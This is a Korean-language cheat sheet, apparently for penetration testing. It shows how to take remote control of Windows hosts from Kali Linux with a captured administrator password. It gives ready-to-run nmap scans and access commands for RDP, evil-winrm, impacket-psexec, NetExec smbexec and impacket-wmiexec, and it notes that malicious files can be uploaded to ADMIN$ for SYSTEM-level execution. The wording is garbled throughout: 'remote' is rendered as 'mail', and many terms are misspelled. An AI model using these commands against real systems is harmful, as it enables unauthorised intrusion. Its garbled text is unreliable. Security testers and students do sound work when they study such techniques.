# 🪟 Windows 우편 접근 방법 (from Kali Linux)

이 문서는 Kali Linux에서 Windows 호스트에 접근할 수 있는 다양한 우편 접어기와 관련 메치니즘을 정보합니다.
공식 권장 방식, 권장되지 않은 방식, 툴 및 명령어 예시, 실무 시 고려사항 등을 포함합니다.
※ 정보수집 단계에서 `Administrator / Password123!` 계정을 획득한 것으로 가정합니다.

---

## 📌 공식적으로 권장되는 우편 접근 방식

### ✅ 1. RDP (Remote Desktop Protocol)

* **포트**: TCP/3389
* **GUI 기반 접근 방식**
* **로커 관리자 권한 필요 없음**
* **단, 유저 계정은 반드시 `Remote Desktop Users` 그룹에 속해 있어야 함**

#### 🔍 그룹 속성 확인 (Windows)

```powershell
net user 사용자명
# 예시:
net user redraccoon
```

출력 중 `Local Group Memberships`에 `Remote Desktop Users`가 포함되어 있는지 확인

```powershell
net localgroup "Remote Desktop Users"
```

출력 중 일반 유저 계정이 포함되어 있는지 확인


#### 🔍 포트 및 서비스 확인 (Kali)

```bash
nmap -p 3389 <타겟IP> -Pn -n --open
nmap -p 3389 <타겟IP> -Pn -n --open -sV
```

결과 중 VERSION 항목에 "Microsoft Terminal Services"가 있다면 RDP 활성화 확인

#### 💪 Kali에서 접근 방법

**xfreerdp 사용 (Pass-the-Hash 가능):**  ▶️ RDP 가본적 가장 구회가 편한 방식

```bash
xfreerdp /u:administrator /p:'Password123!' /v:<타겟IP> /dynamic-resolution
```

**rdesktop 사용:**  ▶️ 구 보호가 적은 RDP 접근 툴

```bash
rdesktop -u administrator -p 'Password123!' <타겟IP>:3389
```

---

### ✅ 2. WinRM (Windows Remote Management)

* **포트**: TCP/5985 (HTTP), TCP/5986 (HTTPS)
* **SOAP 기반 프로토컴 / PowerShell Remoting의 기반**
* **기본적으로 로커 관리자 권한 필요**
* **단, 계정이 `Remote Management Users` 그룹에 속해 있다면 일반 유저도 사용 가능**

#### 🔍 그룹 속성 확인 (Windows)

```powershell
net user 사용자명
# 예시:
net user redraccoon
```

출력 중 `Local Group Memberships`에 `Remote Management Users`가 포함되어 있는지 확인

```powershell
net localgroup "Remote Management Users"
```

출력 중 일반 유저 계정이 포함되어 있는지 확인


#### 🔍 Kali에서 포트 및 서비스 확인

```bash
nmap -p 5985 <타겟IP> -Pn -n --open
nmap -p 5985 <타겟IP> -Pn -n --open -sV
```

결과 예시:

```
PORT     STATE SERVICE VERSION
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

#### 💪 Kali에서 evil-winrm 사용하여 접근

```bash
evil-winrm -i <타겟IP> -u Administrator -p 'Password123!'
```

**접근 후 명령어 예시:**

```powershell
whoami
menu
```

`evil-winrm`은 파일 업로드/다운로드, PowerShell 스크립트 삽입, DLL 실행 등 고급 기능 제공

---

## ⚠️ 공식적으로 권장되지 않는 접근 방식

### ❗ 3. SMB (Server Message Block)

* **포트**: TCP/445
* **로커 관리자 권한 필요**
* **PSExec 기본의 우편 명령 실행/셜 획득에 자주 사용**

#### 🔍 Kali에서 포트 및 서비스 확인

```bash
nmap -p 445 <타겟IP> -Pn -n --open
nmap -Pn -p 445 -sV -sC -n --open <타겟IP>
```

`microsoft-ds`가 보이면 SMB 서비스가 동작 중임

📁 **ADMIN\$ 공용이란?**

* 기본적인 Windows 관리자용 공용 폴더
* 경로: `C:\Windows`
* 즉, `ADMIN$\system32`는 `C:\Windows\system32`를  \u의미
* 악성 파일 업로드 후 실행 가능

#### 💪 impacket-psexec 사용 예시

```bash
sudo apt update -y && sudo apt install impacket-scripts
```

```bash
impacket-psexec Administrator:'Password123!'@<타겟IP>
```


**impacket-psexec 작동 원리 요약:**

1. ADMIN\$ SMB 공용에 실행 파일 업로드
2. SCM (Service Control Manager)을 통해 서비스 생성
3. 서비스 실행 -> SYSTEM 권한 셜 획득


#### 💪 NetExec 사용 (u CrackMapExec)

```bash
nxc smb <타겟IP> -u Administrator -p 'Password123!' --exec-method smbexec -x whoami
```

---

### ❗ 4. WMI (Windows Management Instrumentation)

* **포트**: TCP/135 (RPC), TCP/445
* **로커 관리자 권한 필요**
* **DCOM + RPC 기본 명령 실행 방식**

#### 🔍 Kali에서 포트 확인

```bash
nmap -p 135,445 <타겟IP> -Pn -n --open -sV -v
```

결과 예시 (WMI 시 WMI-related service, 같은 번호 또는 DCOM 동작 검사):

```
135/tcp open  msrpc   Microsoft Windows RPC
445/tcp open  microsoft-ds Windows 7 - 10 microsoft-ds
```

#### 💪 impacket-wmiexec 사용 예시
```bash
sudo apt update -y && sudo apt install impacket-scripts
```

```bash
impacket-wmiexec Administrator:'Password123!'@<타겟IP>
```


---
